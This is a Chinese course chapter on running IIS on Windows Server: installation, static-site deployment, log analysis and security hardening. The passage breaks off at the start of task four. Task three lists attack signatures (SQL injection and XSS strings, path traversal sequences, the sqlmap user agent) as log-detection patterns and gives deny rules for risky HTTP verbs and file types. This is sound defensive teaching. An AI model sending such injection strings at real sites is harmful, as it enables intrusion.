# 04.项目四 Windows服务器网站管理

---

# 📌 课前回顾

💬

在学习本项目之前，先来回顾一下前面已经学过的内容，看看自己掌握得怎么样。

**回顾问题：**

1. Windows Server常见的网络服务有哪些？（FTP、DNS、DHCP、SMB……）
2. 在项目三中，我们学习了SMB文件共享，FTP是否也可以用来做文件传输？两者有什么区别？
3. SMB和FTP的默认端口号是多少？
4. 服务器的服务（Service）如何启动与停止？

🔗

**知识衔接**：本项目从“网络服务”过渡到“Web 服务”。IIS（Internet Information Services）是 Windows Server 上最重要的 Web 服务组件之一：它让服务器具备对外提供网站、API 等 HTTP/HTTPS 服务的能力。
接下来我们会按“**搭起来 → 跑起来 → 看得见 → 锁起来**”的顺序推进：先安装与理解架构（任务一），再部署一个静态站点（任务二），随后用日志与安全配置形成基础防线（任务三），最后把权限、访问控制与 HTTPS 组合成完整加固方案（任务四）。

---

# 🎯 学习目标

**知识目标：**

- 了解IIS的功能、架构与版本历史
- 理解Web服务器的工作原理与HTTP状态码含义
- 掌握虚拟主机、应用程序池、网站绑定等核心概念
- 理解IIS日志格式及安全审计要点
- 了解IIS常见安全脆弱性与加固策略

**技能目标：**

- 能够在Windows Server上安装并启动IIS服务
- 能够通过IIS管理器和PowerShell创建、配置多个网站
- 能够完成一个静态企业网站的完整部署流程
- 能够查看、筛选并分析IIS访问日志
- 能够对IIS进行基础安全加固配置

**素养目标：**

- 培养规范化运维意识，遵守最小权限原则
- 了解网络安全法规，强化合法合规操作意识

---

# ⚠️ 重难点梳理

**🔴 重点内容**

- IIS的安装与基础配置
- 网站绑定（IP/端口/域名）的配置
- 静态网站的完整部署流程
- 应用程序池的作用与配置
- IIS日志字段含义与查看方法
- 常见安全加固措施（HTTP方法限制、隐藏版本信息等）

**🟡 难点内容**

- 多站点通过Host Header实现虚拟主机（域名绑定区分）
- IIS权限体系：IIS_IUSRS与应用程序池标识的关系
- 日志中的安全事件识别与溯源思路
- SSL/HTTPS证书绑定配置
- Web.config配置文件的作用与常见安全配置项

---

# 任务一 搭建Windows IIS服务

## 🧠 理论知识

### IIS的功能

IIS（Internet Information Services，互联网信息服务）是微软开发的Web服务器，内置于Windows Server中，提供以下核心功能：

| 功能 | 说明 |
| --- | --- |
| **HTTP/HTTPS服务** | 托管静态和动态网站 |
| **FTP服务** | 文件传输服务 |
| **SMTP服务** | 邮件发送服务 |
| **应用程序框架支持** | ASP、[ASP.NET](http://asp.net/)、PHP（需安装CGI模块） |
| **WebDAV** | 基于Web的分布式创作和版本控制 |
| **负载均衡** | 结合ARR（Application Request Routing）实现反向代理和负载均衡 |
| **URL重写** | 支持SEO友好的URL格式 |
| **日志记录** | 详细的访问日志和错误日志 |

---

### IIS核心架构

```
浏览器请求
    ↓
HTTP.sys（内核级驱动，监听端口、队列请求）
    ↓
WAS（Windows Process Activation Service，分发请求）
    ↓
应用程序池（Application Pool）→ 工作进程 w3wp.exe
    ↓
网站 → 应用程序 → 虚拟目录 → 物理目录（磁盘文件）
```

💡

**重点理解**：HTTP.sys工作在内核层，因此IIS的性能非常高；应用程序池是IIS隔离不同网站的核心机制，每个池运行独立的工作进程，一个池崩溃不影响其他网站。

---

### IIS版本对照表

| IIS版本 | 对应Windows版本 | 重要特性 |
| --- | --- | --- |
| IIS 6.0 | Windows Server 2003 | 引入应用程序池，安全性提升 |
| IIS 7.0 | Windows Server 2008/Vista | 模块化架构，[集成.NET](http://xn--vnu568i.net/)管道 |
| IIS 8.0 | Windows Server 2012 | SNI支持、WebSocket协议 |
| IIS 8.5 | Windows Server 2012 R2 | 空闲进程回收、日志增强 |
| IIS 10.0 | Windows Server 2016/2019/2022 | HTTP/2、TLS 1.3（2019+）、HTTP/3实验性支持 |

> 🆕 **补充**：IIS 10在Windows Server 2022中默认支持TLS 1.3，现代Web服务器配置应禁用TLS 1.0/1.1，仅允许TLS 1.2和TLS 1.3。
> 

---

## 🛠️ 实践操作

📋

**学习路径**：前面我们从宏观上认识了 IIS——它的功能、架构（HTTP.sys → WAS → 应用程序池）、以及各版本特性。接下来的四组操作将把这些概念具象化：亲手安装 IIS（图形界面 + 命令行两种方式），认识 IIS 管理器界面，并掌握基础的 PowerShell 管理命令。安装完成后，访问 `http://localhost` 的那一刻，标志着 IIS 已正式”就位”。

### 操作1：通过服务器管理器安装IIS

**详细步骤：**

1. 打开「服务器管理器」（桌面右下角任务栏，或开始菜单搜索）
2. 点击右上角「管理」→「添加角色和功能」
3. 向导页面依次点击：
    - 安装类型 → 选择「**基于角色或基于功能的安装**」→ 下一步
    - 服务器选择 → 保持默认（本地服务器）→ 下一步
    - 服务器角色 → 勾选「**Web服务器（IIS）** 」→ 弹出提示框点击「添加功能」
4. 在「**角色服务**」页面，展开各节点，按需勾选：

| 功能节点 | 推荐勾选 | 说明 |
| --- | --- | --- |
| 常见HTTP功能 | 默认文档、目录浏览、HTTP错误、静态内容 | 基础必选 |
| 性能 | 静态内容压缩 | 提升传输效率 |
| 安全性 | 请求筛选、基本身份验证、Windows身份验证 | 按需选择 |
| 应用程序开发 | [ASP.NET](http://asp.net/) 4.7（如需动态页面） | 静态网站可不选 |
| 管理工具 | IIS管理控制台 | 必选 |
1. 确认安装 → 点击「**安装**」，等待完成（约2-3分钟）
2. 安装完成后，打开浏览器访问 `http://localhost`，出现IIS默认欢迎页面即成功

---

### 操作2：通过PowerShell安装IIS（命令行方式）

```powershell
# 一键安装IIS及常用功能模块
Install-WindowsFeature -Name Web-Server, Web-Common-Http, Web-Static-Content, `
    Web-Default-Doc, Web-Dir-Browsing, Web-Http-Errors, `
    Web-Asp-Net45, Web-Mgmt-Tools, Web-Log-Libraries, `
    Web-Request-Monitor, Web-Http-Tracing, Web-Stat-Compression `
    -IncludeManagementTools

# 验证安装结果（列出已安装的Web相关功能）
Get-WindowsFeature -Name Web-* | Where-Object { $_.InstallState -eq "Installed" } | Format-Table Name, DisplayName
```

---

### 操作3：认识IIS管理器界面

1. 打开 IIS管理器：开始菜单 → 搜索「**IIS**」→ 打开「Internet Information Services (IIS)管理器」
2. 左侧树形结构说明：
    - 顶层：服务器节点（计算机名）
    - 中层：「**网站**」节点，展开后是各站点
    - 最下层：具体网站（如Default Web Site）
3. 中间面板：显示当前节点的所有功能图标（身份验证、SSL、日志、处理程序映射等）
4. 右侧操作面板：对当前选中项进行操作（启动/停止/浏览等）

🖥️

**动手验证**：点击「Default Web Site」→ 右侧点击「浏览 *:80 (http)」，浏览器弹出 IIS 默认欢迎页面即表示安装成功。

---

### 操作4：基础PowerShell管理命令

```powershell
# 导入IIS管理模块
Import-Module WebAdministration

# 查看所有网站及状态
Get-Website

# 查看所有应用程序池
Get-WebConfiguration -Filter "/system.applicationHost/applicationPools/add"

# 启动 / 停止 / 重启网站
Start-Website -Name "Default Web Site"
Stop-Website -Name "Default Web Site"

# 查看工作进程（w3wp.exe）
Get-Process w3wp
```

---

## 📝 任务一知识点总结

> **一句话**：任务一是整个项目的**基石**——认识 IIS 架构（HTTP.sys → WAS → 应用程序池 → w3wp.exe），掌握安装方法（图形界面 + PowerShell），为后续部署与安全配置打好基础。
> 

| 概念 | 要点 |
| --- | --- |
| IIS 架构 | HTTP.sys（内核监听）→ WAS（分发）→ 应用程序池（隔离）→ w3wp.exe（工作进程） |
| 安装原则 | 最小化安装，仅选必需角色服务，减少攻击面 |
| 应用程序池 | 每站独立池，一个池崩溃不影响其他站点 |
| 版本 | IIS 10.0 为主流，支持 HTTP/2、TLS 1.3（2019+） |
| 验证 | `http://localhost` 出现默认页即安装成功 |

---

# 任务二 IIS部署静态网站实战

## 💡 本节案例

🌟

**《原神》角色图鉴静态网站**

本案例模拟一个游戏角色百科站点，收录原神主要角色的属性、技能、故事介绍，全部使用HTML+CSS+少量JS构建，**无需任何后端或数据库**，非常适合演示IIS静态托管的完整流程，且贴近同学们的日常兴趣。

案例特点：

- 多页面文件结构：index.html（首页角色列表）、character.html（角色详情页）、about.html（关于本站）
- 包含图片资源目录（/images/chars/）和样式/脚本（/css/style.css、/js/main.js）
- 可演示默认文档、目录浏览关闭、自定义404错误页等IIS配置功能
- 可进一步扩展为双站点（主站 www.genshin-wiki.local + 测试站 test.genshin-wiki.local）演示虚拟主机绑定

---

## 🧠 理论知识

### 网站核心概念

| 概念 | 说明 | 示例 |
| --- | --- | --- |
| **物理路径** | 网站文件存储在服务器磁盘上的真实路径 | C:inetpubwwwrootgenshin |
| **网站绑定** | IP地址+端口+主机名的组合，确定网站监听哪些请求 | *:80:www.genshin-wiki.local |
| **默认文档** | 访问目录时自动返回的文件名列表 | index.html、default.htm |
| **应用程序池** | 为网站提供独立运行环境的工作进程容器 | GenshinAppPool |
| **虚拟目录** | 将磁盘上其他位置的目录映射到网站URL路径下 | /downloads → C:files| |
| **主机名（Host Header）** | 通过域名区分同一IP+端口上的不同网站 | www.genshin-wiki.local vs test.genshin-wiki.local |

### 🧩 知识点小结（核心概念）

- **物理路径**决定“文件在哪儿”；**默认文档**决定“访问目录时返回哪个文件”。
- **绑定三要素（IP/端口/主机名）**决定“请求进到哪个站点”；**主机名**是同端口多站点（虚拟主机）的关键。
- **应用程序池**决定“由哪个工作进程提供服务”，是性能与安全隔离的核心。
- **虚拟目录**用于“把外部目录映射进站点 URL”，但也需要额外关注权限与暴露面。

### ✅ 快速实践（把概念对上号）

1. 在 IIS 管理器中依次点击：网站 → 你的站点 → **基本设置 / 绑定 / 默认文档 / 虚拟目录**，分别找到上表对应项。

2. 把你当前站点的三要素抄下来：`IP:端口:主机名`，并解释“为什么这个组合能唯一定位一个站点”。

3. 打开“应用程序池”列表，确认你的站点使用的池名称，并找到对应 `w3wp.exe` 是否存在（任务一操作4中的 `Get-Process w3wp`）。

---

### 静态网站 vs 动态网站

| 对比维度 | 静态网站 | 动态网站 |
| --- | --- | --- |
| 文件类型 | .html .css .js .jpg | .asp .aspx .php + 数据库 |
| 服务器处理 | 直接返回文件，无需计算 | 服务器端执行代码后返回 |
| 性能 | 极快，IIS可直接缓存 | 较慢，依赖应用层处理 |
| 安全风险 | 低（无后端逻辑） | 较高（SQL注入、代码注入等） |
| IIS配置复杂度 | 低 | 高（需安装对应运行时） |

### 🧩 知识点小结（静态 vs 动态）

- **静态站**：IIS 直接返回文件（HTML/CSS/JS/图片），部署快、性能好、风险相对更低。
- **动态站**：IIS 需要把请求交给应用运行时（[ASP.NET/PHP](http://ASP.NET/PHP) 等）执行后再返回，能力更强，但配置更复杂、攻击面更大。

**本项目任务二选择静态站**，是为了把“站点创建/绑定/默认文档/错误页/虚拟主机”这些 IIS 基础能力练扎实；后续再把动态技术栈叠加上去，会更容易定位问题。

---

## 🛠️ 实践操作

📋

**学习路径**：前面我们已经理解了网站的核心概念——物理路径、绑定、默认文档、应用程序池、虚拟目录……，现在就来**动手实现**这些配置。从创建目录结构、部署网页文件，到绑定域名、配置虚拟主机，每个操作都与前述概念一一对应。

### 操作1：准备网站文件

在服务器上创建网站目录和文件：

```powershell
# 创建网站目录结构
New-Item -ItemType Directory -Path "C:\inetpub\wwwroot\genshin"
New-Item -ItemType Directory -Path "C:\inetpub\wwwroot\genshin\css"
New-Item -ItemType Directory -Path "C:\inetpub\wwwroot\genshin\js"
New-Item -ItemType Directory -Path "C:\inetpub\wwwroot\genshin\images\chars"
New-Item -ItemType Directory -Path "C:\inetpub\wwwroot\genshin\errors"

Write-Host "目录结构创建完成" -ForegroundColor Green
```

**将以下文件复制到对应目录（源码见课程配套资源包）：**

| 文件路径 | 说明 |
| --- | --- |
| `genshin\index.html` | 首页（角色卡片列表 + 元素筛选） |
| `genshin\character.html` | 角色详情页（通过URL参数切换角色） |
| `genshin\about.html` | 关于本站 |
| `genshin\errors\404.html` | 自定义404错误页 |
| `genshin\css\style.css` | 全局样式（深色主题） |
| `genshin\js\main.js` | 角色数据与交互逻辑 |

---

### 操作2：在IIS管理器中创建新网站

**图形界面操作步骤：**

1. 打开 IIS管理器 → 展开服务器节点 → 右键点击「**网站**」→「**添加网站**」
2. 填写网站信息：
    - 网站名称：`GenshinWebSite`
    - **应用程序池**：点击「选择」→ 点击「新建应用程序池」→ 命名为 `GenshinAppPool`，.NET CLR版本选「无托管代码」（纯静态网站）→ 确定
    
    **⚠️ 注意：IIS管理器界面中没有直接的”新建应用程序池”按钮**
    
    如果在”选择应用程序池”对话框中没有看到”新建”选项，请按以下方式操作：
    
    **方法一：先创建应用程序池，再分配给网站**
    
    1. 关闭”添加网站”对话框
    2. 在IIS管理器左侧导航树中，展开服务器节点，找到并右键点击「**应用程序池**」
    3. 选择「**添加应用程序池**」
    4. 在弹出窗口中：
        - 名称：`GenshinAppPool`
        - .NET CLR 版本：选择「**无托管代码**」（因为是纯静态网站）
        - 托管管道模式：集成
    5. 点击「**确定**」完成创建
    6. 返回创建网站流程，在”应用程序池”下拉列表中即可选择刚创建的 `GenshinAppPool`
    
    **方法二：使用默认应用程序池，后续再更改**
    
    1. 创建网站时，先使用 `DefaultAppPool`
    2. 网站创建完成后，选中该网站 → 右侧”操作”面板 → 点击「**基本设置**」→ 点击”应用程序池”旁边的「**选择**」按钮
    3. 在弹出的对话框中选择或创建应用程序池
    - **物理路径**：`C:\inetpub\wwwroot\`genshin
    - **绑定类型**：http
    - **IP地址**：全部未分配（或填写具体IP）
    - **端口**：`8080`（避免与默认网站的80端口冲突）
    - 主机名：留空
3. 点击「**确定**」创建网站
4. 右侧面板点击「**浏览 *:8080 (http)** 」，浏览器应显示原神角色图鉴首页

---

### 操作3：通过PowerShell创建网站（命令行方式）

```powershell
Import-Module WebAdministration

# 创建专用应用程序池（无托管代码，适合纯静态网站）
New-WebAppPool -Name "GenshinAppPool"
Set-ItemProperty IIS:\AppPools\GenshinAppPool -Name managedRuntimeVersion -Value ""
Set-ItemProperty IIS:\AppPools\GenshinAppPool -Name startMode -Value "AlwaysRunning"

# 创建网站，绑定端口8080
New-Website -Name "GenshinWebSite" `
    -Port 8080 `
    -PhysicalPath "C:\inetpub\wwwroot\genshin" `
    -ApplicationPool "GenshinAppPool"

# 验证网站已启动
Get-Website -Name "GenshinWebSite"
```

---

### 操作4：配置默认文档

```powershell
# 查看当前默认文档列表
Get-WebConfiguration -Filter "/system.webServer/defaultDocument/files/*" `
    -PSPath "IIS:\Sites\GenshinWebSite"

# 添加自定义默认文档（优先级最高）
Add-WebConfigurationProperty -Filter "/system.webServer/defaultDocument/files" `
    -PSPath "IIS:\Sites\GenshinWebSite" `
    -Name "." `
    -Value @{value="index.html"}
```

**或通过IIS管理器操作：**

选中网站 → 双击「**默认文档**」→ 点击右侧「添加」→ 输入 `index.html` → 使用「上移」将其置顶

---

### 操作5：配置虚拟主机（多站点同端口80）

📡

**场景**：同一台服务器同一IP，端口80同时运行主站（www.genshin-wiki.local）和测试站（test.genshin-wiki.local）。

```powershell
# 修改主站绑定，加上主机名
Set-WebBinding -Name "GenshinWebSite" -BindingInformation "*:8080:" `
    -PropertyName BindingInformation -Value "*:80:www.genshin-wiki.local"

# 创建测试站
New-Item -ItemType Directory -Path "C:\inetpub\wwwroot\genshin-test"
"<h1>测试站 - TEST</h1>" | Out-File "C:\inetpub\wwwroot\genshin-test\index.html" -Encoding UTF8

New-Website -Name "GenshinTestSite" `
    -Port 80 `
    -HostHeader "test.genshin-wiki.local" `
    -PhysicalPath "C:\inetpub\wwwroot\genshin-test" `
    -ApplicationPool "DefaultAppPool"
```

**或通过IIS管理器图形界面操作：**

1. 打开 **IIS管理器** → 展开服务器节点 → 选中「**GenshinWebSite**」网站
2. 点击右侧「**操作**」面板中的「**绑定…** 」
3. 在「网站绑定」窗口中，选中现有的 `:8080:` 绑定 → 点击「**编辑**」
4. 修改绑定信息：
    - **类型**：http
    - **IP地址**：全部未分配
    - **端口**：`80`
    - **主机名**：`www.genshin-wiki.local`
5. 点击「**确定**」保存主站绑定
6. 创建测试站目录和文件（可通过资源管理器或PowerShell完成）：
    - 创建目录：`C:\inetpub\wwwroot\genshin-test`
    - 在该目录下创建 `index.html`，内容：`&lt;h1&gt;测试站 - TEST&lt;/h1&gt;`
7. 在IIS管理器中，右键点击「**网站**」→「**添加网站**」
8. 填写测试站信息：
    - 网站名称：`GenshinTestSite`
    - **应用程序池**：DefaultAppPool（或创建新的）
    - **物理路径**：`C:\inetpub\wwwroot\genshin-test`
    - **绑定类型**：http
    - **IP地址**：全部未分配
    - **端口**：`80`
    - **主机名**：`test.genshin-wiki.local`
9. 点击「**确定**」创建测试站
10. 验证配置：在IIS管理器中可以看到两个网站都绑定端口80，但主机名不同

**测试方式**：在hosts文件（`C:\Windows\System32\drivers\etc\hosts`）中添加：（IP地址为自己服务器的IP地址）

```jsx
192.168.1.100  www.genshin-wiki.local
192.168.1.100  test.genshin-wiki.local
```

---

### 操作6：配置自定义404错误页

1. 在网站目录创建 `errors\404.html`：

确认 `errors\404.html` 已存在于网站目录（源码见资源包）。

1. IIS管理器 → 选中网站 → 双击「**错误页**」→ 找到 `404` → 双击 → 选择「执行URL」→ 输入 `/errors/404.html`
2. 错误页选中404 ，右侧菜单点击编辑功能设置 设置为✅ **自定义错误页** 路径留空

**或通过PowerShell命令配置：**

```powershell
# 配置自定义404错误页（执行URL方式）
Set-WebConfigurationProperty -Filter "/system.webServer/httpErrors/error[@statusCode='404']" `
    -PSPath "IIS:\Sites\GenshinWebSite" `
    -Name "path" `
    -Value "/errors/404.html"

Set-WebConfigurationProperty -Filter "/system.webServer/httpErrors/error[@statusCode='404']" `
    -PSPath "IIS:\Sites\GenshinWebSite" `
    -Name "responseMode" `
    -Value "ExecuteURL"

# 验证配置
Get-WebConfigurationProperty -Filter "/system.webServer/httpErrors/error[@statusCode='404']" `
    -PSPath "IIS:\Sites\GenshinWebSite" `
    -Name "path"
```

**测试自定义404页面：**

1. 在浏览器中访问一个不存在的页面，如：`http://www.genshin-wiki.local/nonexistent.html`
2. 应该看到自定义的404错误页面，而不是IIS默认的错误页
3. 检查IIS日志，确认请求被记录为404状态码

---

## 📝 任务二知识点总结

> **一句话**：任务二从”认识 IIS”进入”动手部署”——创建网站、配置绑定、实现虚拟主机、设置自定义错误页，完成一个静态网站的完整上线流程。
> 

| 概念 | 要点 |
| --- | --- |
| 静态网站 | 仅 HTML/CSS/JS，IIS 直接返回文件，无需后端环境，安全风险最低 |
| 网站绑定三要素 | IP + 端口 + 主机名，三者组合唯一确定一个监听规则 |
| 虚拟主机 | 多站点共用 IP:80，靠主机名（Host Header）区分，需配合 DNS 或 hosts |
| 应用程序池 | 纯静态站 .NET CLR 设为「无托管代码」 |
| 默认文档 | 访问目录时自动加载的文件，可自定义优先级 |
| 自定义 404 页 | 隐藏服务器信息，基础安全加固的第一步 |

---

# 任务三 IIS日志查看与安全配置

## 🧠 理论知识：纵深防御——从感知到拦截

一个 HTTP 请求进入 IIS 后，要经过四层安全防线。本任务的任务是理解并配置前三层（日志、请求筛选、安全响应头），最后用 Web.config 统一管理。

```
HTTP 请求到达
    ↓
[第一层] 日志审计 —— 记录每个请求，建立正常访问基线
    ↓ 通过分析日志发现异常行为
[第二层] 请求筛选 —— 从方法、扩展名、URL长度三个维度过滤恶意请求
    ↓ 拦截危险请求，减少被攻击的可能
[第三层] 安全响应头 + 错误页 —— 隐藏服务器信息，降低攻击成功率
    ↓ 即使被扫描，也不暴露技术栈和目录结构
[第四层] Web.config —— 一份文件承载全部安全配置（任务五展开）
```

---

### 第一层：日志审计——看得见问题

IIS 默认使用 **W3C 扩展日志格式**，文件存储于 `C:\inetpub\logs\LogFiles\W3SVC{网站ID}\`，命名规则 `u_ex年月日.log`。

日志是安全审计的**核心数据源**——所有后续防御动作（加 IP 黑名单、配置请求筛选、加固权限）都以日志分析结果为依据。

**日志字段**——每条日志记录了请求的完整画像：

| 字段 | 含义 | 安全分析时的关注点 |
| --- | --- | --- |
| date / time | 请求时间（**UTC**，北京时间 +8） | 判断攻击发生的时间段 |
| c-ip | 客户端 IP | 定位攻击来源 |
| cs-method | 请求方法（GET/POST/…） | 异常方法如 TRACE、OPTIONS |
| cs-uri-stem | 请求的文件路径 | 是否在扫描敏感路径 |
| sc-status | HTTP 状态码 | 404 大量出现 = 目录扫描 |
| sc-substatus | IIS 子状态码 | 401.1 暴力破解、401.3 权限不足 |
| cs(User-Agent) | 客户端标识 | 含 sqlmap/nikto = 自动化扫描 |
| time-taken | 处理耗时（毫秒） | 异常偏高可能被注入 |

**HTTP 状态码速查：**

| 状态码 | 含义 | 安全含义 |
| --- | --- | --- |
| 200 | 成功 | 正常访问 |
| 301 / 302 | 重定向 | 配置了跳转 |
| 401 | 未授权 | 可能是暴力破解（子码 .1）或权限问题（.3） |
| 403 | 禁止 | IP 被拒（.6）、目录浏览被禁、权限不足 |
| 404 | 未找到 | **大量出现**可能是目录扫描 |
| 500 | 服务器错误 | 被攻击者触发了应用异常 |

**日志分析的核心思路——建立基线：**

先了解正常访问的模式（每天多少请求、主要访问哪些页面、状态码分布），才能识别偏离基线的异常。就像医生看病，先了解正常体征，才能判断哪里出了问题。

---

### 第二层：请求筛选——拦得住恶意请求

日志让我们”看见”了攻击（如大量 404、sqlmap 的 User-Agent），接下来就是**拦截**这些请求。IIS 的”请求筛选”功能从三个维度过滤：

| 维度 | 配置位置 | 作用 |
| --- | --- | --- |
| **HTTP 方法** | 请求筛选 → HTTP谓词 | 静态站只需 GET/HEAD/POST，拒绝 TRACE/PUT/DELETE |
| **文件扩展名** | 请求筛选 → 文件名扩展名 | 拒绝访问 `.config`、`.bat`、`.exe` 等敏感文件 |
| **URL 长度** | 请求筛选 → URL（编辑功能设置） | 限制最大 URL（4096字节）和查询字符串（2048字节），防止缓冲区溢出 |

**常见 Web 攻击在日志中的特征——“看什么 → 拦什么”：**

| 攻击类型 | 日志中的线索 | 对应的拦截措施 |
| --- | --- | --- |
| 目录扫描 | 同一 IP 短时间大量 404，路径呈 `/admin`、`/backup` 字典遍历 | IP 黑名单（任务四） |
| SQL 注入 | URI 含 `UNION SELECT`、`OR 1=1`、`%27` | URL 长度限制 + WAF |
| XSS 攻击 | URI 含 `<script>`、`javascript:` | CSP 响应头（第三层） |
| 路径穿越 | URI 含 `../`、`%2e%2e%2f` | 双编码拒绝（denyDoubleEncoding） |
| 暴力破解 | 同一 IP 大量 401，针对 `/login`、`/admin` | IP 限制 + HTTP 方法限制 |

> 上表体现了纵深防御的核心思想：**同一类攻击，多个层面共同防御**。日志发现 → IP 黑名单阻断 + 请求筛选过滤 + 响应头降低成功率。
> 

---

### 第三层：安全响应头与错误页——防泄露

即使攻击者能访问网站，我们也要尽量**不暴露有用信息**：

| 配置项 | 要做的事 | 为什么 |
| --- | --- | --- |
| 删除 `X-Powered-By` | 移除该响应头 | 暴露了 ASP.NET 技术栈，攻击者可针对性利用 |
| 添加 `X-Frame-Options` | 设为 `SAMEORIGIN` | 防止页面被其他网站 iframe 嵌套（点击劫持） |
| 添加 `X-Content-Type-Options` | 设为 `nosniff` | 防止浏览器将文件当作其他类型解析 |
| 禁用目录浏览 | 关闭该功能 | 否则攻击者可直接看到网站文件结构 |
| 自定义错误页 | 用自己的 404.html 替代默认页 | IIS 默认错误页暴露服务器版本信息 |

---

### 第四层：Web.config——统一管全部配置

前三层的所有配置最终都可以写入一个 `Web.config` 文件。IIS 管理器中改的设置，大部分最终也会写入这个文件。

**配置优先级（高→低）：** 网站根目录 `Web.config` > 子目录 `Web.config` > 服务器级 `applicationHost.config`

> 🔧 **IIS 管理器 vs Web.config**：IIS 管理器适合交互式操作和验证，Web.config 适合批量部署、版本管理和自动化运维。实际工作中通常”先用界面验证一遍，再把稳定配置整理进 Web.config”。
> 

**Web.config 安全配置基础模板（前三层的统一）：**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <!-- 第二层：安全响应头 -->
    <httpProtocol>
      <customHeaders>
        <remove name="X-Powered-By" />
        <add name="X-Frame-Options" value="SAMEORIGIN" />
        <add name="X-Content-Type-Options" value="nosniff" />
        <add name="X-XSS-Protection" value="1; mode=block" />
        <add name="Content-Security-Policy" value="default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:" />
      </customHeaders>
    </httpProtocol>
    <!-- 第二层：请求筛选 -->
    <security>
      <requestFiltering>
        <verbs allowUnlisted="true">
          <add verb="TRACE" allowed="false" />
          <add verb="OPTIONS" allowed="false" />
          <add verb="PUT" allowed="false" />
          <add verb="DELETE" allowed="false" />
        </verbs>
        <fileExtensions allowUnlisted="true">
          <add fileExtension=".config" allowed="false" />
          <add fileExtension=".bat" allowed="false" />
          <add fileExtension=".cmd" allowed="false" />
          <add fileExtension=".exe" allowed="false" />
          <add fileExtension=".ps1" allowed="false" />
          <add fileExtension=".bak" allowed="false" />
          <add fileExtension=".log" allowed="false" />
        </fileExtensions>
        <requestLimits maxUrl="4096" maxQueryString="2048" />
      </requestFiltering>
    </security>
    <!-- 第三层：自定义错误页 -->
    <httpErrors errorMode="DetailedLocalOnly" existingResponse="Replace">
      <remove statusCode="404" />
      <remove statusCode="500" />
      <error statusCode="404" path="/errors/404.html" responseMode="ExecuteURL" />
    </httpErrors>
    <!-- 第三层：禁用目录浏览 -->
    <directoryBrowse enabled="false" />
  </system.webServer>
</configuration>
```

---

## 🛠️ 实践操作

### 操作1：配置日志（第一层）

1. IIS管理器 → 选中网站 → 双击「**日志**」→ 确认格式为 **W3C**
2. 点击「选择字段」，额外勾选 `cs(Referer)`、`sc-substatus`、`time-taken`
3. 滚动周期设为「**每日**」，日志目录建议改到数据盘（如 `D:\IISLogs`）

> **验证**：访问网站后打开最新日志文件，确认 `#Fields` 行包含新增字段，搜索访问页面路径确认 `time-taken` 值正常（< 500ms）。
> 

---

### 操作2：日志分析与故障定位（第一层→第二层）

1. 打开日志目录，找到最新日志文件，用记事本打开
2. 先看 `#Fields` 行确认各列含义
3. 用 `Ctrl+F` 搜索关键字：`404`、`500`、`sqlmap`、`../`
4. 记录三个关键信息：异常IP、请求路径、状态码

**案例：页面样式丢失**

浏览器能打开首页但无样式 → 打开日志搜索 `style.css` → 404 说明文件缺失，403 说明权限不足（NTFS 问题，任务四解决），200 则检查浏览器缓存。

> 这里体现了第一层到第二层的衔接：**日志发现问题（第一层）→ 根据日志线索决定防御措施（第二层起）** 。
> 

---

### 操作3：配置安全响应头（第三层）

IIS管理器 → 选中网站 → 双击「HTTP响应标头」→ 逐个添加：

| 名称 | 值 | 作用 |
| --- | --- | --- |
| X-Frame-Options | SAMEORIGIN | 防点击劫持 |
| X-Content-Type-Options | nosniff | 防 MIME 嗅探 |
| X-XSS-Protection | 1; mode=block | 旧版浏览器 XSS 防护 |

在同一界面**删除** **`X-Powered-By`**（暴露 ASP.NET 技术栈）。

再双击「目录浏览」→ 确认「已禁用」。双击「错误页」→ 选中 404/500 → 配置自定义页面路径。

> **验证**：F12 → Network → 刷新 → 检查 Response Headers 包含安全标头且无 `X-Powered-By`；访问不存在路径应显示自定义 404 页。
> 

---

### 操作4：配置请求筛选（第二层）

选中网站 → 双击「请求筛选」：

**拒绝危险扩展名**（文件名扩展名选项卡）：

| 扩展名 | 拒绝原因 |
| --- | --- |
| `.config` | 泄露连接字符串、密钥 |
| `.bat` / `.cmd` / `.ps1` | 可执行脚本 |
| `.exe` / `.msi` | 可执行文件 |
| `.bak` / `.old` / `.log` | 备份/日志可能含敏感数据 |

**限制 URL 长度**（URL 选项卡 → 编辑功能设置）：最大 URL `4096`，最大查询字符串 `2048`。

> 💡 过长 URL 可能触发缓冲区溢出漏洞（如 CVE-2022-21907），这是纵深防御的一环——即使底层存在漏洞，URL 长度限制也能在一定程度上阻断利用。
> 

---

### 操作5：Web.config 统一部署（第四层）

将操作3和操作4的所有配置整合到一份 Web.config 中（见上方理论部分的模板），放入网站根目录。

> 如果页面保存后异常，优先检查 XML 拼写和标签是否成对。
> 

---

**处置——纵深防御的闭环体现：**

| 步骤 | 防御层 | 操作 |
| --- | --- | --- |
| 立即阻断 | 第二层（+任务四IP限制） | IIS管理器 → IP地址和域限制 → 添加拒绝条目 |
| 证据保留 | 第一层 | 备份日志文件到归档目录 |
| 排查入侵 | 第一层 | 检查攻击者是否有 200 状态码的成功请求 |
| 加固修复 | 第二层+第三层 | 确认请求筛选、目录浏览、错误页配置完善 |
| 持续监控 | 第一层 | 设置定期日志分析，对异常 404 数量设告警阈值 |

---

## 📝 任务三知识点总结

> **一句话**：任务三构建了纵深防御的前三层——日志让我们**看得见**问题，请求筛选让我们**拦得住**恶意请求，安全响应头和错误页让我们**不泄露**有用信息，Web.config 让我们**统一管理**全部配置。
> 

**关键知识点串联回顾：**

| 层 | 做什么 | 为什么 |
| --- | --- | --- |
| 日志审计 | 记录请求、建立基线、分析异常 | 不看日志就无法发现攻击 |
| 请求筛选 | 限制 HTTP 方法/文件扩展名/URL 长度 | 从源头拦截恶意请求 |
| 安全响应头+错误页 | 移除版本信息、添加防护头、自定义错误页 | 减少信息暴露，提高攻击门槛 |
| Web.config | 一份文件承载以上所有配置 | 便于批量部署和版本管理 |

---

# 任务四 IIS安全管理综合实践

## 🧠 理论知识：从被动到主动——事前防御

任务三解决了”发现问题、拦截明显威胁”（被动防御），本任务升级为**从根源预防**（主动防御）——让攻击在到达网站之前就被阻断。

```
任务三回顾（被动防御）                任务四目标（主动防御）
┌─────────────────────┐      ┌─────────────────────────┐
│ 日志：看得见问题     │      │ 权限：从文件系统层面隔离  │
│ 请求筛选：拦住恶意请求│  →   │ 应用池：进程级隔离       │
│ 响应头：防信息泄露    │      │ IP限制：控制谁能访问     │
│ Web.config：统一管理  │      │ HTTPS：加密传输通道      │
└─────────────────────┘      └─────────────────────────┘
```

本任务的防御层级：

```
[第一层] 权限控制 —— 最小权限原则
